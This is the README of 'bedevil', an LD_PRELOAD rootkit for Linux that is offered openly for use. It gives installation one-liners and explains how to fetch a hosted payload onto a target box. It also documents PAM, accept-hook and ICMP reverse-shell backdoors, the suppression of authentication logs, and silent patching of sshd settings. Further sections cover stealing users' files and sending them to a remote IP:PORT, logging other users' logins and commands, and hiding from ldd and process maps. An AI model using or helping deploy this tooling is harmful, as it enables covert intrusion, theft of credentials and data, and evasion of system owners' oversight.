# bedevil

 * 1. [Overview](#1-overview)
 * 2. [Usage](#2-usage)
   * [Installation example](#21-installation-example)
 * 3. [Updating existing installations](#3-updating-existing-installations)
   * [Seamless updates](#31-seamless-updates)
   * [Updating an old bdvl](#32-updating-an-old-bdvl)
 * 4. [Features & configuration information](#4-features-configuration-information)
   * [Backdoor utility commands](#41-backdoor-utility-commands)
   * [Magic GID](#42-magic-gid)
     * [Changeable magic GID](#421-changeable-magic-gid)
     * [Automatic magic GID changer](#422-automatic-magic-gid-changer)
   * [__HIDE_MY_ASS__](#43-hide_my_ass)
     * [__UNINSTALL_MY_ASS__](#431-uninstall_my_ass)
   * [Backdoors](#44-backdoors)
     * [PAM backdoor](#441-pam-backdoor)
     * [Accept hook backdoor](#442-accept-hook-backdoor)
     * [ICMP backdoor](#443-icmp-backdoor)
   * [Dynamic linker patching](#45-dynamic-linker-patching)
   * [File stealing](#46-file-stealing)
     * [Behaviour tweaking](#461-behaviour-tweaking)
     * [Other notes](#462-other-notes)
   * [Sneaky logging](#47-sneaky-logging)
   * [Hidden connections](#48-hidden-connections)
     * [Hidden ports](#481-hidden-ports)
     * [Hidden IPv4 addresses](#482-hidden-ipv4-addresses)
   * [Detection evasion](#49-detection-evasion)
     * [Process memory maps](#491-process-memory-maps)
     * [Various utilities](#492-various-utilities)

 * 5. [Other notes](#5-other-notes)

<hr>

## 1. Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * This is based on the [original bdvl](https://github.com/kcaaj/bdvl/tree/master), however...
   * This repository is much different from the original.
     * Besides new additions, there have been many improvements.
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't either
     * Will be installed by `etc/auto.sh` before rootkit installation
     * Or can be installed with `etc/depinstall.sh`

<hr>

## 2. Usage
 * Getting an installation up & running is pretty easy.
 * First you'll want to edit maybe a small handful of settings in `setup.py`.
   * You can fine tune a decent amount of stuff to your liking.
 * Next, `sh etc/depinstall.sh && make`...
   * Now in the `build/` directory there are three new files.
     * `<PAM_UNAME>.b64`
     * `bdvl.so.*`
     * `<PAM_UNAME>.h` ([Updating existing installations](#3-updating-existing-installations))
 * When it comes to the actual installation, you have three choices.
   * Host the result (_for example_) `build/changeme.b64` file somewhere accessible from the target box & point the first variable in `etc/auto.sh` to wherever `changeme.b64` may be.
   * On the box, when running `etc/auto.sh` supply it a path as an argument to this file wherever it is.
   * Or with the compiled `bdvl.so.*` you can run ``LD_PRELOAD=./build/bdvl.so.`uname -m` sh -c './bdvinstall build/*.so.*'``.
     * This is how `etc/auto.sh` installs bdvl after installing dependencies.

### 2.1. Installation example
 * On my own machine here, I've configured bdvl how I like & have built it.
 * The output that you can expect to see from these stages may differ very slightly from the images but the process remains the same.

<img src=https://i.imgur.com/PTdmRS5.png alt=building-bdvl />

 * In this example I am using `etc/auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
 * The last command sent in that screenshot is once the target box is listening for my connection, as seen in the example below.

<img src=https://i.imgur.com/pmwGUb8.png alt=installation-process />

 * Now the rootkit will be in effect & you'll be able to log in.
 * In the example below I am using the 3 backdoor methods available in bdvl.

<img src=https://i.imgur.com/pqpJHTy.png alt=first-backdoor-login />

### 2.2. Notes
 * Due to how bdvl installs itself, there is some pretty decent flexibility when it comes to how you can get your install onto the box.
 * To try to explain, I'll use a oneliner that I frequently use while testing...
 * ``tar xpfz bdvl.tar.gz && rm bdvl.tar.gz; cd bdvl/; nano setup.py; clear; make; LD_PRELOAD=./build/bdvl.so.`uname -m` sh -c './bdvinstall build/*.so.*'``
   * Now this is on my test environment, so...
   * I uploaded `bdvl.tar.gz` prior to running that...
   * Dependencies are already present...
 * Once I exit nano, the kit compiles, installs itself & then is ready to go & I can access any backdoor I like.
   * This is basically a much shorter version of `etc/auto.sh` however that script uses an already-configured setup, so there is no editing `setup.py` beforehand.
   * Not to mention that `etc/auto.sh` installs required dependencies before trying to install the kit.
   * My point is ultimately that you can create your own (idea of) `etc/auto.sh` if that's something you'd like to do.

<hr>

## 3. Updating existing installations
 * Once compiled & ready to go, the header file for your configuration will be in the `build/` directory.
 * You may want to keep this, just in case.

### 3.1. Seamless updates
 * The **newest** version of bdvl comes with an option which allows for seamless updates to the rootkit on systems which already have it installed.
 * You can access this via the rootkit's [backdoor utilities](#41-backdoor-utility-commands) when in a magic shell.
 * The command & required arguments are as follows: `./bdv update /path/to/newbdvl.so*`
 * When updating the target installation, bdvl will read necessary settings from the first `bdvl.so` in argv.
 * With the implementation of this, you can effortlessly enable/disable rootkit features, change backdoor credentials & whatever else, on the fly.
 * When using this option, directories & files from the previous/current installation are removed.
   * There is an appropriate warning to let you know this before bdvl goes through with updating the installation.
 * With this method you do not need to worry about using the same paths, magic GID, or any other setting for that matter.
   * Other than your backdoor credentials, if you want to keep them the same that is...

#### 3.1.1. Example
 * In this example, I am in a backdoor shell & have this repository downloaded & extracted in my/the rootkit's home directory.
 * For brevity I've removed unimportant output from the example. (`-snip-` is \[unimportant] text I've removed)
```
 # nano setup.py  # change backdoor login credentials?
 # make

-snip-

 # ./bdv update build/bdvl.so.armv7l

-snip, previous/current rootkit stuff is removed-

If you want to get noticed, you've got to mingle.
No SELinux.
Creating installation directory.
Copied: bdvl.so.armv7l
Installed.


DONE! RECONNECT!!
Killed
Connection to remule closed.

```
 * Upon completion the new installation of bdvl will be in effect, as will anything you changed.

#### 3.1.2. Notes
 * As stated `./bdv update` is only an option in new versions of bdvl.
 * But that doesn't mean you can't update old versions...
   * It's possible, however it will take a little more effort...
   * Not a great deal though. Think of it like a cross referencing game...
 * The below section, ([Updating an old bdvl](#32-updating-an-old-bdvl) aptly details this process.

### 3.2. Updating an old bdvl
 * Depending on how old the target installation is, you may or may not have the `bdv.h` for it. (likely not)
 * It is *fairly* simple to upgrade an old version, if you're careful about it.
 * You'll need to gather what settings you can from the current installation.
 * At the absolute very least, what you need to know is:
   * `INSTALL_DIR`, `PRELOAD_FILE`/`OLD_PRELOAD` & `BDVLSO`
 * Anything else, for example paths, you can determine is a bonus so you don't have to worry about things becoming unhidden...
   * If the target installation is that old, it won't do anything even akin to uninstalling itself, so take care.
 * Everything you've gathered needs to go into `inc/bdv.h` after a `make`.
 * It will also be worth checking if new dependencies are required for the rootkit since the installation's version.
   * **i.e.** run `etc/depinstall.sh`
 * bdvl's resulting `config.h`may be worth checking also.
 * Once everything you have gathered is in `bdv.h` & the `*_LEN` values match up, `make kit` to make sure everything went well.
   * If it compiles successfully, you can replace the existing `bdvl.so` on the target system with the new one.
     * **i.e.** replace `/lib/guojkvn/guojkvn.so.x86_64` with the newly compiled `./build/bdvl.so.x86_64`
   * It may perhaps be worth your time installing in a test environment before you ruin a box.

<hr>

## 4. Features & configuration information
 * Listed in the table below is a very concise overview of all of the *important* functionalities that bedevil has.
 * Most can be enabled/disabled from within `setup.py` & the others in `config.h`.

| Toggle                      | Info                                                                          |
| :-------------------------- | :---------------------------------------------------------------------------- |
| __USE_PAM_BD__              | allows interactive login as a backdoor user via ssh.                          |
| __USE_ICMP_BD__             | magic packets are replied to with a reverse shell.                            |
| __USE_ACCEPT_BD__           | get a magic shell from infected services listening on tcp sockets.            |
| __LOG_LOCAL_AUTH__          | log successful user authentications on the box.                               |
| __LOG_SSH__                 | logs login attempts from over ssh.                                            |
| __LOG_USER_EXEC__           | logs some stuff executed by users. straight from exec hooks.                  |
| __HIDE_SELF__               | hides files and processes based on rootkit magic GID.                         |
| __FORGE_MAPS__              | hides rootkit presence from process map files.                                |
| __HIDE_PORTS__              | hides ports & port ranges defined in 'hide_ports' file.                       |
| __DO_EVASIONS__             | hides rootkit presence from unsavoury processes.                              |
| __READ_GID_FROM_FILE__      | magic GID value is changeable from backdoor shell via command.                |
| __AUTO_GID_CHANGER__        | the magic GID will refresh every so often. see comments.                      |
| __HIDE_MY_ASS__             | keep track of all hidden paths created by rootkit user (for rehiding).        |
| __UNINSTALL_MY_ASS__        | paths kept track of by HIDE_MY_ASS will be recursively removed on uninstall.  |
| __SSHD_PATCH_HARD__         | this keeps `UsePAM` & `PasswordAuthentication` enabled, __hardmode__.         |
| __SSHD_PATCH_SOFT__         | not unlike the one mentioned above however is only applied for `sshd`.        |
| __ROOTKIT_BASHRC__          | the rootkit will write & lock down `.bashrc` & `.profile`.                    |
| __BACKDOOR_UTIL__           | allows access to a host of backdoor utilities. see comments.                  |
| __SET_MAGIC_ENV_UNHIDE__    | set magic env var in `./bdv unhideself` shell process.                        |
| __BACKDOOR_PKGMAN__         | safe package management access from backdoor shell.                           |
| __FILE_STEAL__              | steal specified files when opened & accessed by users.                        |
| __PATCH_DYNAMIC_LINKER__    | rootkit overwrites the original `/etc/ld.so.preload` path with a new one.     |

 * By default, all are enabled.
 * __A handful of functionalities do not begin until the first backdoor login.__

### 4.1. Backdoor utility commands
 * By hooking the execve & execvp wrappers bdvl provides rootkit-related commands from a backdoor shell, accessible by running `./bdv`.

<img src=https://i.imgur.com/jbkNOHt.png alt=available-backdoor-commands-in-bdvl />

### 4.2. Magic GID
 * bdvl uses a typical magic GID for hiding rootkit paths & processes.
 * However there is some more flexibility when it comes to the rootkit's magic GID.
 * For starters, you can choose the maximum value for the GID in `setup.py`.

#### 4.2.1. Changeable magic GID
 * With `READ_GID_FROM_FILE` enabled in `setup.py`, the rootkit's magic GID is determined by the contents of a file.
   * Opposed to being a fixed value.
 * By doing `./bdv changegid` from a backdoor shell you will be able to change the magic GID.
   * **Do not** manually change the value by editing the contents of the file the rootkit reads from.
   * bdvl takes care of bdvl stuff.

#### 4.2.2. Automatic magic GID changer
 * With `READ_GID_FROM_FILE` enabled in `setup.py`, the rootkit will refresh its magic GID every so often.
 * How frequently it changes is determined by the value of `GID_CHANGE_MINTIME`.
 * The default behaviour is to change every 20 minutes but you can adjust this if you like.
 * The rootkit will not automatically change its GID when there are still rootkit processes running.
   * Otherwise there is a pretty high chance of being discovered since processes left with the previous GID would be visible.

### 4.3. __HIDE_MY_ASS__
 * `HIDE_MY_ASS` is intended to be a means of keeping track of files & directories created, __outside of the home & installation directory__, by (you) the rootkit user.
   * For example something you created in `/home/someuser`.
 * Initially this was only for rehiding things when the rootkit is changing its magic GID.
   * But is now accompanied by `UNINSTALL_MY_ASS`...
 * Your random hidden paths are automatically kept track of upon creation/opening/reading/writing in a backdoor shell/general rootkit process.
 * The file which contains all paths can be found in `my_ass` within the backdoor home directory.
   * Paths in here are rehidden upon GID changes.
   * If you are to unhide a path after its creation (path GID = 0), it will be ignored when changing magic GID.
   * Also if you would like to stop a path from being automatically rehidden upon a GID change remove the path's line.
 * Paths that are not tracked can be found in `NOTRACK` in `setup.py`.
   * By default these paths are, `/proc`, `/root`, `/tmp` & rootkit paths.
   * The first three are important for a few reasons... Basically big breakage without them...
   * Plus rootkit paths are inherently tracked... There is no time they'll ever not be tracked.
 * Anyway, you *should* be able to do everything you need to do from your very own home directory...
   * However if that isn't the case, this is here as a kind of safety in case you leave a random file somewhere & it would end up no longer hidden...

#### 4.3.1. __UNINSTALL_MY_ASS__
 * Thanks to `HIDE_MY_ASS`, when uninstalling the kit from the target, bdvl will remove all of the paths it is keeping track of...
 * Again, this is really here as a bit of safety...

### 4.4. Backdoors
 * All of the backdoors available in bdvl are password protected.
   * By `BACKDOOR_PASSWORD` in `setup.py`.
   * When the value is set to `None` random garbage will be used as the password.
   * The password is stored as a SHA512 hash.

#### 4.4.1. PAM backdoor
 * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
 * [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/nobash/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
 * The responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/nobash/inc/hooks/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.
 * Additionally the functions responsible for writing authentication logs have been hooked & intercepted to totally stop any sort of logs being written upon backdoor login.
   * See these hooks, [here (syslog)](https://github.com/kcaaj/bdvl/tree/nobash/inc/hooks/syslog) & [here (pam_syslog)](https://github.com/kcaaj/bdvl/blob/nobash/inc/backdoor/pam/pam_syslog.c).
   * _If the parent process of whatever is trying to write said auth log is that of a hidden process, the function in question simply does nothing._
   * Previously in bedevil, when interacting with the PAM backdoor, a log would be written stating that a session had been opened/closed for the root user.
   * So now this is no longer the case...
 * A problem with using this is that `UsePAM` & `PasswordAuthentication` must be enabled in the sshd config.
   * bdvl presents a couple of solutions for this. Really though it presents one solution as both work the same, primarily just at different times.
   * __HARD_PATCH_SSHD_CONFIG__ will constantly make sure the `sshd_config` file stays the way it needs to, rewriting the file when changes need to be made.
   * __SOFT_PATCH_SSHD_CONFIG__ works more or less exactly the same way as above, but applies only for the `sshd` process & does not *really* touch `sshd_config`. Basically `sshd` will read what we say it should.
     * No direct file writes/changes (to `sshd_config`) are necessary for this method. The file will appear to be untouched by any external forces when doing a normal read on it.
   * See [here](https://github.com/kcaaj/bdvl/tree/nobash/inc/backdoor/pam/sshdpatch) for more insight on how these work.
 * The rootkit's installation directory & your backdoor home directory are in two totally different & random locations.
   * I figured it was pretty important to separate the two spaces.
   * When no rootkit processes are running (_i.e.: not logged into the backdoor_) the rootkit will remove your `.bashrc` & `.profile`, that is until you log back in.
   * I have made everything easily accessible from the backdoor's home directory by plopping symlinks to everything you may need access to.
     * Not unlike `.bashrc` & `.profile` these symlinks are removed from the home directory until you log in.
 * If you are not root upon login, `su root` will get you set up.

#### 4.4.2. Accept hook backdoor
 * Infected services that listen on TCP sockets for new connections, when accepting a new connection can drop you a shell.
 * For example, after sshd has restarted, it is going to be infected...
   * So with each connection it receives it will beforehand check if the connection came from a very special port.
   * The very special port will always be the first port number in `hide_ports`.

#### 4.4.3. ICMP backdoor
 * When enabled, bdvl will spawn a hidden process on the box which will monitor a given interface for a determined magic packet.
   * The rootkit needs to be able to determine whether or not the ICMP backdoor process needs to be spawned.
   * Therefore this spawned process has its own special ID. `readgid()-1`
   * Before sending the shell back to you, another child is created so that the GID can be set back to the original. (`getgid()+1`)
 * When the rootkit is changing magic GID, automatically or with `./bdv changegid` the backdoor's process is killed & then respawned.
 * I recommend changing `MAGIC_ID`, `MAGIC_SEQ` & `MAGIC_ACK` in `setup.py`.
   * Just remember to update `etc/icmp.sh` with the new values when changing these.
 * `etc/icmp.sh` will handle sending the magic packet & listening for & receiving a reverse shell.
   * The backdoor will ignore any attempts for a reverse shell if the specified port is not a hidden port.

### 4.5. Dynamic linker patching
 * Upon installation the rootkit will patch the dynamic linker libraries.
 * Before anything the rootkit will search for valid `ld.so` on the system to patch.
   * See `util/install/ldpatch/ldpatch.h` for the paths it will search.
 * Both the path to overwrite (`/etc/ld.so.preload`) & the new path (__PRELOAD_FILE__ in `setup.py`) must be the same length as each other.
 * When running `./bdv uninstall` from a backdoor shell, the rootkit will revert the libraries back to having the original path. (`/etc/ld.so.preload`)
 * [See here](https://github.com/kcaaj/bdvl/blob/nobash/inc/util/install/ldpatch/ldpatch.h) for more on how this works.
 * Not having __PATCH_DYNAMIC_LINKER__ enabled will instruct the rootkit to just use `/etc/ld.so.preload` instead.

### 4.6. File stealing
 * With `FILE_STEAL` enabled in `setup.py` bdvl can & will steal files on the box when users are interacting with them in any way.
 * Target filenames that are of interest & that will be stolen are defined in `setup.py`. (`INTERESTING_FILES`)
   * Wildcards apply to filenames within this list...
   * **i.e.:** `INTERESTING_FILES = ['*.zip', '*.rar', '*.txt', '*.db', 'backup.*']`
 * Files that are within directories listed in `INTERESTING_DIRECTORIES` will also be stolen.
   * For example if `/var` is in the list, stuff from `/var/log` will be stolen... As well as from every other directory in `/var`.
   * Hence `/root` & `/home` are already in the list.
 * If a file is deemed interesting upon a user's interaction, a new process is spawned off of the user's process before the target file is mapped into memory & copied into our hidden directory.
   * If it's possible, the new process is hidden ASAP.

#### 4.6.1. Behaviour tweaking
 * You may have to slightly tweak the behaviour of bdvl's file stealer, depending on the type of environment you are intending on installing on.
 * For example, if installing on an embedded device with a fairly small amount of storage you might only want to be able to store a couple gig or less of stolen data...
 * Or if you are extracting stolen data from the target at a somewhat frequent rate you might want stolen data to automatically remove itself at closer intervals...
 * A brief overview of the settings & values you can alter:
   * '*Can be disabled*' means that by setting the respective value to `None` the kit will not act on the value, i.e. it will be disabled...
   * `STOLEN_STORAGE` - **prioritise sending target files to this box.** setting format is `IP:PORT`. setting `NO_DISK_WRITE` to `True` will instruct the rootkit not to write the file copy to disk if, for some reason, it cannot be sent.
     * `etc/hoarder.c` is compiled on a `make`. See this.
   * `FILE_CLEANSE_TIMER` - **how often to remove stolen files.** default frequency is every 12 hours. can be disabled.
   * `MAX_FILE_SIZE` - **don't steal files bigger than this.** default max size is 2gb. can be disabled.
   * `ORIGINAL_RW_FALLBACK` - **if mapping the file fails, read target & write copy in chunks.**
   * `MAX_STEAL_SIZE` - **how much stuff can be stored at one time.** default max size is 10gb. can be disabled.
   * `NAMES_BLACKLIST` - **do not steal files which names match items in this list.** mainly for ignoring certain files in directories. can be disabled, is by default.

#### 4.6.2. Other notes
 * As stated, files are stolen as the user is interacting with them so file access times are not being (seemingly) arbitrarily modified.
 * A file referenced by something such as `rm` by a user will be stolen before being removed.
   * `rm` is just a random example. This same logic applies for anything.
 * If a file has been stolen already, it will be ignored.
   * However if there has been a change in size since the last time it was stolen, it will be re-stolen.
 * Depending on the system, if multiple substantially large files are being copied at one time there might be a slightly noticeable impact on the system's performance.

### 4.7. Sneaky logging
 * __LOG_LOCAL_AUTH__
   * bedevil will intercept `pam_vprompt` and log successful authentications for local users on the box.
   * Log results are available in your installation directory.
 * __LOG_SSH__
   * bedevil intercepts `read` and `write` in order to log outgoing login attempts over ssh.
   * Again, logs are available in your installation directory.
 * __LOG_USER_EXEC__
   * Stuff executed by local users on the box is logged, straight from the exec hooks.
   * Miscellaneous stuff is logged along with this, like scheduled scripts for example.
 * `MAX_LOGS_SIZE` is available in `setup.py` which will cap how much of **each** log type can be stored.
   * *100mb* is the default value for this & seems definitely waaay more than adequate.

### 4.8. Hidden connections
 * Within `setup.py` are some settings for ports & addresses that bdvl will hide by default.
 * bdvl presents a few options for keeping secret connections secret.

#### 4.8.1. Hidden ports
 * The default behaviour of the configuration stage in `setup.py` is to generate two random port numbers (`NUM_HIDDEN_PORTS`) as the default hidden ports for the installation.
 * You can either change how many random port numbers `setup.py` will give you, or if you would like instead you can specify your own (**valid**) ports by putting them in the `CUSTOM_PORTS` list just below.
   * **i.e.:** `NUM_HIDDEN_PORTS = 4`
   * or `CUSTOM_PORTS = [9001, 9002, 9003, 9004]`
 * After installation & logging in, there will be a `hide_ports` file available in your backdoor home directory.
   * Each port to hide has its own line.
   * Additionally you can also specify port ranges, along with individual port numbers.
     * With a hyphen (`-`) being the range delimiter...
   * Note that if you are using the accept backdoor you are given a dedicated hidden port, which is always going to be the **first** port number in the contents of that file. (so you *can* change it)

#### 4.8.2. Hidden IPv4 addresses
 * By default bdvl does not hide any IPv4 addresses.
 * If you like you can specify addresses to hide by putting them in the `HIDDEN_IP_ADDRS` list in `setup.py`.
   * **i.e.:** `HIDDEN_IP_ADDRS  = ['192.168.1.112', ...]`
   * **Leaving this list empty at setup disables this in the kit.**
 * Connections received from the specified addresses are hidden on the box by bdvl.
 * Much like bdvl's hidden ports, you can add, edit & remove addresses from the `hide_addrs` file in your home directory upon logging in.
   * Each address must have a line of its own.
 * When uninstalling - `./bdv uninstall` - this file is removed...

### 4.9. Detection evasion

#### 4.9.1. Process memory maps
 * bdvl conceals the location of the rootkit, when loaded, from the outputs of process memory maps.
   * `/proc/$$/maps`, `/proc/$$/smaps`, `/proc/$$/numa_maps`
 * Usually the rootkit's dependencies (`libcrypt.so`, `libpcap.so`) would've also been visible.
   * However the dependencies in question will also not appear... (they're hidden)
   * If this is a problem for any reason, define `NO_HIDE_DEPENDENCIES` in `config.h`.

#### 4.9.2. Various utilities
 * bbdvl hides the rootkit presence from various defined scary processes, paths & environment variables.
 * The list of aforementioned processes, paths & variables can be found in `setup.py`.
 * Essentially the rootkit will uninstall itself before forking to allow execution of something which may reveal the fact that it is installed.
 * Once the process, for example, has finished doing whatever it was doing, the rootkit will reinstall itself in the parent process.
 * A downside is that this requires the calling process to be root to pull this off.
   * Therefore if a regular (non-root) user tries doing something we don't *really* want them doing we return an insufficient permissions error.
 * **i.e.:** Running `ldd`.
   * Calling `ldd` as a regular user will show an error.
   * This user's privileges do not suffice.
   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
   * Running `ldd` again with sufficient privilege will show a totally clean output.
   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.

<hr>

### 5. Other notes
 * Behaviour exhibited by __PATCH_DYNAMIC_LINKER__ can be observed by a regular user.
   * https://twitter.com/ForensicITGuy/status/1170149837490262016
     * `find /lib*/ -name 'ld-2*.so' -exec grep '/etc/ld.so.preload' {} \;`
   * Additionally if `/etc/ld.so.preload` seems to do nothing when written to, you know your box is infected.

 * A magic ID is a bruteforcable value.
   * https://pastebin.com/rZvjDzFK
     * Depending on the system something like this could take a long time until the target ID is reached.
   * bdvl somewhat lessens the threat of something like this with the implementation of the automatic GID changer.
